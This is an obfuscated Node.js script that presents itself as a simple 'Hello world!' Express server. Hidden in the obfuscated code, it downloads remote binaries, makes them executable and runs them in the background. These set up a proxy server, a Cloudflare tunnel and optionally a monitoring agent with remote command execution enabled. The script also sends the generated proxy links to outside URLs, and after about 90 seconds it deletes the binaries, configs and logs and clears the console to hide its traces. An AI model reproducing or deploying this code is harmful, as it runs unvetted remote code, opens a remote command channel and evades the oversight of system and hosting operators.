const _0x269232=_0xdd27;(function(_0x2a30e4,_0x417f52){const _0x83857b=_0xdd27,_0x17681c=_0x2a30e4();while(!![]){try{const _0x20dcd3=-parseInt(_0x83857b(0x1fd))/0x1+-parseInt(_0x83857b(0x221))/0x2*(parseInt(_0x83857b(0x1f3))/0x3)+-parseInt(_0x83857b(0x207))/0x4+parseInt(_0x83857b(0x1ee))/0x5+-parseInt(_0x83857b(0x1c4))/0x6+-parseInt(_0x83857b(0x1c7))/0x7*(parseInt(_0x83857b(0x24e))/0x8)+-parseInt(_0x83857b(0x1e8))/0x9*(-parseInt(_0x83857b(0x244))/0xa);if(_0x20dcd3===_0x417f52)break;else _0x17681c['push'](_0x17681c['shift']());}catch(_0x2ea823){_0x17681c['push'](_0x17681c['shift']());}}}(_0x3033,0x9c90b));const express=require(_0x269232(0x1d1)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x269232(0x1bd)),{promisify}=require(_0x269232(0x1c8)),exec=promisify(require('child_process')[_0x269232(0x241)]),{execSync}=require(_0x269232(0x233)),UPLOAD_URL=process[_0x269232(0x1f7)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x269232(0x1f7)][_0x269232(0x1f6)]||'',AUTO_ACCESS=process[_0x269232(0x1f7)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x269232(0x1f7)][_0x269232(0x252)]||_0x269232(0x20c),SUB_PATH=process[_0x269232(0x1f7)][_0x269232(0x23f)]||_0x269232(0x263),PORT=process['env'][_0x269232(0x231)]||process['env'][_0x269232(0x1e4)]||0xbb8,UUID=process[_0x269232(0x1f7)][_0x269232(0x25e)]||_0x269232(0x1ea),NEZHA_SERVER=process[_0x269232(0x1f7)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x269232(0x1ed)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x269232(0x1f7)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x269232(0x1f7)][_0x269232(0x1fe)]||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x269232(0x238)]||'cdns.doon.eu.org',CFPORT=process[_0x269232(0x1f7)]['CFPORT']||0x1bb,NAME=process[_0x269232(0x1f7)][_0x269232(0x21e)]||'';!fs[_0x269232(0x267)](FILE_PATH)?(fs[_0x269232(0x1bc)](FILE_PATH),console[_0x269232(0x249)](FILE_PATH+_0x269232(0x242))):console[_0x269232(0x249)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0xa3c11f=_0x269232,_0x534472='abcdefghijklmnopqrstuvwxyz';let _0x3fdb07='';for(let _0x421c3d=0x0;_0x421c3d<0x6;_0x421c3d++){_0x3fdb07+=_0x534472[_0xa3c11f(0x1fb)](Math['floor'](Math[_0xa3c11f(0x1e3)]()*_0x534472[_0xa3c11f(0x1f0)]));}return _0x3fdb07;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x269232(0x22e)](FILE_PATH,npmName),phpPath=path[_0x269232(0x22e)](FILE_PATH,phpName),webPath=path[_0x269232(0x22e)](FILE_PATH,webName),botPath=path[_0x269232(0x22e)](FILE_PATH,botName),subPath=path[_0x269232(0x22e)](FILE_PATH,_0x269232(0x1d6)),listPath=path[_0x269232(0x22e)](FILE_PATH,_0x269232(0x208)),bootLogPath=path[_0x269232(0x22e)](FILE_PATH,_0x269232(0x1dd)),configPath=path[_0x269232(0x22e)](FILE_PATH,_0x269232(0x1cd));function deleteNodes(){const _0x253eed=_0x269232;try{if(!UPLOAD_URL)return;if(!fs[_0x253eed(0x267)](subPath))return;let _0x2841bb;try{_0x2841bb=fs[_0x253eed(0x21c)](subPath,'utf-8');}catch{return null;}const _0x357287=Buffer[_0x253eed(0x21b)](_0x2841bb,'base64')['toString']('utf-8'),_0x5468b8=_0x357287[_0x253eed(0x256)]('\x0a')[_0x253eed(0x234)](_0x2097cb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x253eed(0x26d)](_0x2097cb));if(_0x5468b8[_0x253eed(0x1f0)]===0x0)return;return axios[_0x253eed(0x22b)](UPLOAD_URL+_0x253eed(0x229),JSON[_0x253eed(0x1f9)]({'nodes':_0x5468b8}),{'headers':{'Content-Type':'application/json'}})[_0x253eed(0x1d8)](_0x52ea8a=>{return null;}),null;}catch(_0x1b3592){return null;}}function cleanupOldFiles(){const _0x4e50a9=_0x269232;try{const _0x39f55b=fs[_0x4e50a9(0x1fa)](FILE_PATH);_0x39f55b[_0x4e50a9(0x1be)](_0x5a1948=>{const _0x3dcb50=_0x4e50a9,_0x2bf92c=path['join'](FILE_PATH,_0x5a1948);try{const _0x2f697d=fs[_0x3dcb50(0x203)](_0x2bf92c);_0x2f697d[_0x3dcb50(0x255)]()&&fs[_0x3dcb50(0x1c9)](_0x2bf92c);}catch(_0x164699){}});}catch(_0x94de81){}}app[_0x269232(0x1f8)]('/',function(_0x28a995,_0x1f8930){const _0xc94968=_0x269232;_0x1f8930[_0xc94968(0x209)](_0xc94968(0x239));});async function generateConfig(){const _0x55c5e8=_0x269232,_0x5568b8={'log':{'access':_0x55c5e8(0x1cb),'error':_0x55c5e8(0x1cb),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x55c5e8(0x216),'settings':{'clients':[{'id':UUID,'flow':_0x55c5e8(0x269)}],'decryption':_0x55c5e8(0x1f1),'fallbacks':[{'dest':0xbb9},{'path':_0x55c5e8(0x210),'dest':0xbba},{'path':_0x55c5e8(0x253),'dest':0xbbb},{'path':_0x55c5e8(0x277),'dest':0xbbc}]},'streamSettings':{'network':_0x55c5e8(0x1ce)}},{'port':0xbb9,'listen':_0x55c5e8(0x259),'protocol':_0x55c5e8(0x216),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x55c5e8(0x1f1)}},{'port':0xbba,'listen':_0x55c5e8(0x259),'protocol':_0x55c5e8(0x216),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x55c5e8(0x1f1),'wsSettings':{'path':_0x55c5e8(0x210)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x55c5e8(0x222),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x55c5e8(0x259),'protocol':_0x55c5e8(0x24b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x55c5e8(0x253)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x55c5e8(0x259),'protocol':_0x55c5e8(0x23d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x55c5e8(0x1f1),'wsSettings':{'path':_0x55c5e8(0x277)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x55c5e8(0x222),_0x55c5e8(0x1ca)],'metadataOnly':![]}}],'dns':{'servers':[_0x55c5e8(0x218)]},'outbounds':[{'protocol':_0x55c5e8(0x1eb),'tag':_0x55c5e8(0x1c3)},{'protocol':_0x55c5e8(0x228),'tag':_0x55c5e8(0x270)}]};fs['writeFileSync'](path[_0x55c5e8(0x22e)](FILE_PATH,'config.json'),JSON[_0x55c5e8(0x1f9)](_0x5568b8,null,0x2));}function getSystemArchitecture(){const _0x205b14=_0x269232,_0x542169=os[_0x205b14(0x260)]();return _0x542169===_0x205b14(0x272)||_0x542169===_0x205b14(0x278)||_0x542169===_0x205b14(0x25a)?'arm':_0x205b14(0x22a);}function downloadFile(_0x53f66f,_0x59f703,_0x29eb71){const _0x127996=_0x269232,_0x42b305=_0x53f66f;!fs[_0x127996(0x267)](FILE_PATH)&&fs[_0x127996(0x1bc)](FILE_PATH,{'recursive':!![]});const _0x14a566=fs['createWriteStream'](_0x42b305);axios({'method':_0x127996(0x1f8),'url':_0x59f703,'responseType':'stream'})[_0x127996(0x246)](_0x4b447e=>{const _0x3cbc28=_0x127996;_0x4b447e[_0x3cbc28(0x217)][_0x3cbc28(0x227)](_0x14a566),_0x14a566['on'](_0x3cbc28(0x264),()=>{const _0x5be348=_0x3cbc28;_0x14a566[_0x5be348(0x1ff)](),console[_0x5be348(0x249)](_0x5be348(0x254)+path[_0x5be348(0x224)](_0x42b305)+_0x5be348(0x261)),_0x29eb71(null,_0x42b305);}),_0x14a566['on']('error',_0x5c24a5=>{const _0x46623d=_0x3cbc28;fs[_0x46623d(0x1f4)](_0x42b305,()=>{});const _0x22ff83=_0x46623d(0x254)+path[_0x46623d(0x224)](_0x42b305)+_0x46623d(0x1df)+_0x5c24a5[_0x46623d(0x21d)];console[_0x46623d(0x201)](_0x22ff83),_0x29eb71(_0x22ff83);});})['catch'](_0x3ea1d4=>{const _0x5096b8=_0x127996,_0x12ab96=_0x5096b8(0x254)+path[_0x5096b8(0x224)](_0x42b305)+_0x5096b8(0x1df)+_0x3ea1d4['message'];console[_0x5096b8(0x201)](_0x12ab96),_0x29eb71(_0x12ab96);});}async function downloadFilesAndRun(){const _0x1a094c=_0x269232,_0x1247da=getSystemArchitecture(),_0x410f5f=getFilesForArchitecture(_0x1247da);if(_0x410f5f[_0x1a094c(0x1f0)]===0x0){console[_0x1a094c(0x249)](_0x1a094c(0x20f));return;}const _0x314e24=_0x410f5f[_0x1a094c(0x1ef)](_0x4b4bfc=>{return new Promise((_0x122b60,_0x2804bf)=>{const _0x36585f=_0xdd27;downloadFile(_0x4b4bfc[_0x36585f(0x20a)],_0x4b4bfc['fileUrl'],(_0x2f2282,_0x1e0668)=>{_0x2f2282?_0x2804bf(_0x2f2282):_0x122b60(_0x1e0668);});});});try{await Promise['all'](_0x314e24);}catch(_0x207506){console[_0x1a094c(0x201)](_0x1a094c(0x23b),_0x207506);return;}function _0x483f0f(_0x5b1985){const _0x11837d=_0x1a094c,_0x3395c9=0x1fd;_0x5b1985[_0x11837d(0x1be)](_0x6ec8e=>{const _0x31eee5=_0x11837d;fs['existsSync'](_0x6ec8e)&&fs[_0x31eee5(0x247)](_0x6ec8e,_0x3395c9,_0x216576=>{const _0x5e4a34=_0x31eee5;_0x216576?console['error'](_0x5e4a34(0x24d)+_0x6ec8e+':\x20'+_0x216576):console[_0x5e4a34(0x249)](_0x5e4a34(0x225)+_0x6ec8e+':\x20'+_0x3395c9[_0x5e4a34(0x206)](0x8));});});}const _0x4b449e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x483f0f(_0x4b449e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x54df9e=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x1e35f8=new Set([_0x1a094c(0x240),_0x1a094c(0x22f),_0x1a094c(0x226),'2087','2083',_0x1a094c(0x1d0)]),_0x5a734b=_0x1e35f8['has'](_0x54df9e)?_0x1a094c(0x1f5):_0x1a094c(0x1cf),_0x5217c4='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1a094c(0x1cc)+NEZHA_SERVER+_0x1a094c(0x274)+_0x5a734b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1a094c(0x1e0)](path[_0x1a094c(0x22e)](FILE_PATH,_0x1a094c(0x236)),_0x5217c4);const _0x5b5222='nohup\x20'+phpPath+_0x1a094c(0x219)+FILE_PATH+_0x1a094c(0x271);try{await exec(_0x5b5222),console['log'](phpName+_0x1a094c(0x268)),await new Promise(_0x1cb714=>setTimeout(_0x1cb714,0x3e8));}catch(_0x31ab16){console[_0x1a094c(0x201)](_0x1a094c(0x212)+_0x31ab16);}}else{let _0x4abf85='';const _0x5c9e72=[_0x1a094c(0x240),_0x1a094c(0x22f),'2096','2087',_0x1a094c(0x1e2),'2053'];_0x5c9e72[_0x1a094c(0x235)](NEZHA_PORT)&&(_0x4abf85=_0x1a094c(0x1e9));const _0x545c9=_0x1a094c(0x25f)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1a094c(0x26b)+NEZHA_KEY+'\x20'+_0x4abf85+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x545c9),console['log'](npmName+_0x1a094c(0x268)),await new Promise(_0xa3795d=>setTimeout(_0xa3795d,0x3e8));}catch(_0x2b453a){console['error'](_0x1a094c(0x275)+_0x2b453a);}}}else console[_0x1a094c(0x249)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x52b746=_0x1a094c(0x25f)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x52b746),console[_0x1a094c(0x249)](webName+_0x1a094c(0x268)),await new Promise(_0x300960=>setTimeout(_0x300960,0x3e8));}catch(_0x468981){console[_0x1a094c(0x201)](_0x1a094c(0x26f)+_0x468981);}if(fs['existsSync'](botPath)){let _0x7ee7c1;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x7ee7c1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1a094c(0x24f)](/TunnelSecret/)?_0x7ee7c1='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1a094c(0x20b):_0x7ee7c1=_0x1a094c(0x220)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1a094c(0x25f)+botPath+'\x20'+_0x7ee7c1+'\x20>/dev/null\x202>&1\x20&'),console[_0x1a094c(0x249)](botName+_0x1a094c(0x268)),await new Promise(_0x3d25d0=>setTimeout(_0x3d25d0,0x7d0));}catch(_0x5b9163){console['error'](_0x1a094c(0x1fc)+_0x5b9163);}}await new Promise(_0x255045=>setTimeout(_0x255045,0x1388));}function getFilesForArchitecture(_0x41bd94){const _0x5e518e=_0x269232;let _0x28fcef;_0x41bd94===_0x5e518e(0x272)?_0x28fcef=[{'fileName':webPath,'fileUrl':_0x5e518e(0x1c6)},{'fileName':botPath,'fileUrl':_0x5e518e(0x25b)}]:_0x28fcef=[{'fileName':webPath,'fileUrl':_0x5e518e(0x20e)},{'fileName':botPath,'fileUrl':_0x5e518e(0x1bb)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5a1c3c=_0x41bd94===_0x5e518e(0x272)?_0x5e518e(0x26c):'https://amd64.ssss.nyc.mn/agent';_0x28fcef[_0x5e518e(0x214)]({'fileName':npmPath,'fileUrl':_0x5a1c3c});}else{const _0x2cc4c0=_0x41bd94===_0x5e518e(0x272)?_0x5e518e(0x230):_0x5e518e(0x276);_0x28fcef[_0x5e518e(0x214)]({'fileName':phpPath,'fileUrl':_0x2cc4c0});}}return _0x28fcef;}function argoType(){const _0x294a28=_0x269232;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x294a28(0x249)](_0x294a28(0x1ba));return;}if(ARGO_AUTH[_0x294a28(0x235)](_0x294a28(0x205))){fs[_0x294a28(0x1e0)](path[_0x294a28(0x22e)](FILE_PATH,_0x294a28(0x26a)),ARGO_AUTH);const _0x251b80='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x294a28(0x256)]('\x22')[0xb]+_0x294a28(0x1d2)+path[_0x294a28(0x22e)](FILE_PATH,_0x294a28(0x26a))+_0x294a28(0x273)+ARGO_DOMAIN+_0x294a28(0x24c)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x294a28(0x1e0)](path['join'](FILE_PATH,_0x294a28(0x1c5)),_0x251b80);}else console[_0x294a28(0x249)](_0x294a28(0x279));}async function extractDomains(){const _0x521c04=_0x269232;let _0x456ce9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x456ce9=ARGO_DOMAIN,console[_0x521c04(0x249)](_0x521c04(0x1d5),_0x456ce9),await _0x560da8(_0x456ce9);else try{const _0x57cd76=fs['readFileSync'](path[_0x521c04(0x22e)](FILE_PATH,_0x521c04(0x1dd)),_0x521c04(0x202)),_0x2cbf87=_0x57cd76[_0x521c04(0x256)]('\x0a'),_0x34985e=[];_0x2cbf87[_0x521c04(0x1be)](_0x49a4e1=>{const _0x37ab68=_0x521c04,_0x54a47f=_0x49a4e1['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x54a47f){const _0x4de2a8=_0x54a47f[0x1];_0x34985e[_0x37ab68(0x23a)](_0x4de2a8);}});if(_0x34985e['length']>0x0)_0x456ce9=_0x34985e[0x0],console['log'](_0x521c04(0x1d9),_0x456ce9),await _0x560da8(_0x456ce9);else{console[_0x521c04(0x249)](_0x521c04(0x204)),fs[_0x521c04(0x1c9)](path[_0x521c04(0x22e)](FILE_PATH,'boot.log'));async function _0x3b260e(){const _0x419540=_0x521c04;try{process[_0x419540(0x1f2)]==='win32'?await exec(_0x419540(0x1db)+botName+_0x419540(0x248)):await exec('pkill\x20-f\x20\x22['+botName[_0x419540(0x1fb)](0x0)+']'+botName[_0x419540(0x251)](0x1)+_0x419540(0x1d7));}catch(_0x10d948){}}_0x3b260e(),await new Promise(_0x447405=>setTimeout(_0x447405,0xbb8));const _0x44b142='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x521c04(0x24a)+ARGO_PORT;try{await exec(_0x521c04(0x25f)+botPath+'\x20'+_0x44b142+_0x521c04(0x1e7)),console[_0x521c04(0x249)](botName+_0x521c04(0x268)),await new Promise(_0x5b3b44=>setTimeout(_0x5b3b44,0xbb8)),await extractDomains();}catch(_0x22e82a){console[_0x521c04(0x201)](_0x521c04(0x1fc)+_0x22e82a);}}}catch(_0x45675f){console[_0x521c04(0x201)](_0x521c04(0x215),_0x45675f);}async function _0x16bcaa(){const _0x3febc2=_0x521c04;try{const _0x53f6a8=await axios[_0x3febc2(0x1f8)](_0x3febc2(0x23c),{'timeout':0xbb8});if(_0x53f6a8[_0x3febc2(0x217)]&&_0x53f6a8['data'][_0x3febc2(0x1d4)]&&_0x53f6a8[_0x3febc2(0x217)]['org'])return _0x53f6a8['data']['country_code']+'_'+_0x53f6a8[_0x3febc2(0x217)][_0x3febc2(0x20d)];}catch(_0x43c325){try{const _0x2b728c=await axios[_0x3febc2(0x1f8)](_0x3febc2(0x26e),{'timeout':0xbb8});if(_0x2b728c[_0x3febc2(0x217)]&&_0x2b728c[_0x3febc2(0x217)][_0x3febc2(0x245)]===_0x3febc2(0x237)&&_0x2b728c['data'][_0x3febc2(0x257)]&&_0x2b728c['data'][_0x3febc2(0x20d)])return _0x2b728c[_0x3febc2(0x217)][_0x3febc2(0x257)]+'_'+_0x2b728c[_0x3febc2(0x217)][_0x3febc2(0x20d)];}catch(_0x354907){}}return'Unknown';}async function _0x560da8(_0x1f5bd5){const _0x1a47f2=await _0x16bcaa(),_0x42b5c3=NAME?NAME+'-'+_0x1a47f2:_0x1a47f2;return new Promise(_0x424a80=>{setTimeout(()=>{const _0xf2e289=_0xdd27,_0x28f6d2={'v':'2','ps':''+_0x42b5c3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xf2e289(0x1f1),'host':_0x1f5bd5,'path':_0xf2e289(0x1dc),'tls':_0xf2e289(0x222),'sni':_0x1f5bd5,'alpn':'','fp':_0xf2e289(0x213)},_0x4336dd=_0xf2e289(0x1e6)+UUID+'@'+CFIP+':'+CFPORT+_0xf2e289(0x1e5)+_0x1f5bd5+_0xf2e289(0x232)+_0x1f5bd5+_0xf2e289(0x1c1)+_0x42b5c3+_0xf2e289(0x25c)+Buffer[_0xf2e289(0x21b)](JSON[_0xf2e289(0x1f9)](_0x28f6d2))[_0xf2e289(0x206)](_0xf2e289(0x243))+_0xf2e289(0x1de)+UUID+'@'+CFIP+':'+CFPORT+_0xf2e289(0x22d)+_0x1f5bd5+_0xf2e289(0x232)+_0x1f5bd5+_0xf2e289(0x22c)+_0x42b5c3+_0xf2e289(0x223);console[_0xf2e289(0x249)](Buffer[_0xf2e289(0x21b)](_0x4336dd)['toString'](_0xf2e289(0x243))),fs[_0xf2e289(0x1e0)](subPath,Buffer['from'](_0x4336dd)[_0xf2e289(0x206)](_0xf2e289(0x243))),console[_0xf2e289(0x249)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xf2e289(0x1f8)]('/'+SUB_PATH,(_0x42a183,_0x301362)=>{const _0x137238=_0xf2e289,_0x274d34=Buffer[_0x137238(0x21b)](_0x4336dd)['toString'](_0x137238(0x243));_0x301362[_0x137238(0x1bf)](_0x137238(0x262),_0x137238(0x21f)),_0x301362[_0x137238(0x209)](_0x274d34);}),_0x424a80(_0x4336dd);},0x7d0);});}}async function uploadNodes(){const _0x1b3632=_0x269232;if(UPLOAD_URL&&PROJECT_URL){const _0x23211d=PROJECT_URL+'/'+SUB_PATH,_0x5b665f={'subscription':[_0x23211d]};try{const _0x4a47d5=await axios[_0x1b3632(0x22b)](UPLOAD_URL+_0x1b3632(0x1e1),_0x5b665f,{'headers':{'Content-Type':_0x1b3632(0x23e)}});return _0x4a47d5&&_0x4a47d5[_0x1b3632(0x245)]===0xc8?(console[_0x1b3632(0x249)](_0x1b3632(0x265)),_0x4a47d5):null;}catch(_0x234eca){if(_0x234eca[_0x1b3632(0x1da)]){if(_0x234eca['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b3632(0x267)](listPath))return;const _0x1ddb1f=fs[_0x1b3632(0x21c)](listPath,_0x1b3632(0x202)),_0x420468=_0x1ddb1f['split']('\x0a')[_0x1b3632(0x234)](_0x5a7857=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b3632(0x26d)](_0x5a7857));if(_0x420468[_0x1b3632(0x1f0)]===0x0)return;const _0x5adeb8=JSON[_0x1b3632(0x1f9)]({'nodes':_0x420468});try{const _0x27bd51=await axios[_0x1b3632(0x22b)](UPLOAD_URL+'/api/add-nodes',_0x5adeb8,{'headers':{'Content-Type':_0x1b3632(0x23e)}});return _0x27bd51&&_0x27bd51[_0x1b3632(0x245)]===0xc8?(console[_0x1b3632(0x249)](_0x1b3632(0x1d3)),_0x27bd51):null;}catch(_0x4fc722){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x668f82=_0xdd27,_0x1e739f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1e739f[_0x668f82(0x23a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1e739f[_0x668f82(0x23a)](phpPath);process[_0x668f82(0x1f2)]===_0x668f82(0x1c0)?exec(_0x668f82(0x211)+_0x1e739f[_0x668f82(0x22e)]('\x20')+'\x20>\x20nul\x202>&1',_0x8d0742=>{const _0x27f6a2=_0x668f82;console[_0x27f6a2(0x25d)](),console[_0x27f6a2(0x249)]('App\x20is\x20running'),console[_0x27f6a2(0x249)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x668f82(0x250)+_0x1e739f[_0x668f82(0x22e)]('\x20')+'\x20>/dev/null\x202>&1',_0x951e26=>{const _0xc5d9fd=_0x668f82;console[_0xc5d9fd(0x25d)](),console['log']('App\x20is\x20running'),console[_0xc5d9fd(0x249)](_0xc5d9fd(0x21a));});},0x15f90);}cleanFiles();function _0xdd27(_0x3d03f1,_0x31f847){_0x3d03f1=_0x3d03f1-0x1ba;const _0x3033cd=_0x3033();let _0xdd27c6=_0x3033cd[_0x3d03f1];return _0xdd27c6;}async function AddVisitTask(){const _0x3fd8e2=_0x269232;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3fd8e2(0x249)](_0x3fd8e2(0x1ec));return;}try{const _0x5aa146=await axios[_0x3fd8e2(0x22b)](_0x3fd8e2(0x1c2),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3fd8e2(0x23e)}});return console[_0x3fd8e2(0x249)](_0x3fd8e2(0x266)),_0x5aa146;}catch(_0x5ef74c){return console['error'](_0x3fd8e2(0x258)+_0x5ef74c['message']),null;}}async function startserver(){const _0x3682a5=_0x269232;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x56805f){console[_0x3682a5(0x201)](_0x3682a5(0x200),_0x56805f);}}function _0x3033(){const _0x38f889=['Error\x20reading\x20boot.log:','vless','data','https+local://8.8.8.8/dns-query','\x20-c\x20\x22','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','from','readFileSync','message','NAME','text/plain;\x20charset=utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','4nvTNvd','tls','\x0a\x20\x20\x20\x20','basename','Empowerment\x20success\x20for\x20','2096','pipe','blackhole','/api/delete-nodes','amd','post','&path=%2Ftrojan-argo%3Fed%3D2560#','?security=tls&sni=','join','8443','https://arm64.ssss.nyc.mn/v1','SERVER_PORT','&fp=firefox&type=ws&host=','child_process','filter','includes','config.yaml','success','CFIP','Hello\x20world!','push','Error\x20downloading\x20files:','https://ipapi.co/json/','trojan','application/json','SUB_PATH','443','exec','\x20is\x20created','base64','16900080hEHomn','status','then','chmod','.exe\x20>\x20nul\x202>&1','log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','vmess','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20failed\x20for\x20','60488gqguNo','match','rm\x20-rf\x20','substring','FILE_PATH','/vmess-argo','Download\x20','isFile','split','countryCode','Add\x20automatic\x20access\x20task\x20faild:\x20','127.0.0.1','aarch64','https://arm64.ssss.nyc.mn/bot','\x0a\x0avmess://','clear','UUID','nohup\x20','arch','\x20successfully','Content-Type','sub','finish','Subscription\x20uploaded\x20successfully','automatic\x20access\x20task\x20added\x20successfully','existsSync','\x20is\x20running','xtls-rprx-vision','tunnel.json','\x20-p\x20','https://arm64.ssss.nyc.mn/agent','test','http://ip-api.com/json/','web\x20running\x20error:\x20','block','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','arm','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','/trojan-argo','arm64','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/bot','mkdirSync','path','forEach','set','win32','&path=%2Fvless-argo%3Fed%3D2560#','https://oooo.serv00.net/add-url','direct','1206174pJRpIq','tunnel.yml','https://arm64.ssss.nyc.mn/web','1099BvmcWz','util','unlinkSync','quic','/dev/null','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','config.json','tcp','false','2053','express','\x0a\x20\x20credentials-file:\x20','Nodes\x20uploaded\x20successfully','country_code','ARGO_DOMAIN:','sub.txt','\x22\x20>\x20/dev/null\x202>&1','catch','ArgoDomain:','response','taskkill\x20/f\x20/im\x20','/vmess-argo?ed=2560','boot.log','\x0a\x0atrojan://','\x20failed:\x20','writeFileSync','/api/add-subscriptions','2083','random','PORT','?encryption=none&security=tls&sni=','\x0avless://','\x20>/dev/null\x202>&1\x20&','18yCRMml','--tls','274616f7-d282-4a69-9305-d21f02e7207d','freedom','Skipping\x20adding\x20automatic\x20access\x20task','NEZHA_PORT','4781220qHcKco','map','length','none','platform','1881279jNqCfH','unlink','true','PROJECT_URL','env','get','stringify','readdirSync','charAt','Error\x20executing\x20command:\x20','45485cHaYVc','ARGO_AUTH','close','Error\x20in\x20startserver:','error','utf-8','statSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','TunnelSecret','toString','4028768YWJMJz','list.txt','send','fileName','/tunnel.yml\x20run','./tmp','org','https://amd64.ssss.nyc.mn/web','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vless-argo','del\x20/f\x20/q\x20','php\x20running\x20error:\x20','firefox','unshift'];_0x3033=function(){return _0x38f889;};return _0x3033();}startserver()[_0x269232(0x1d8)](_0x58de36=>{const _0x2a4951=_0x269232;console[_0x2a4951(0x201)]('Unhandled\x20error\x20in\x20startserver:',_0x58de36);}),app['listen'](PORT,()=>console[_0x269232(0x249)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
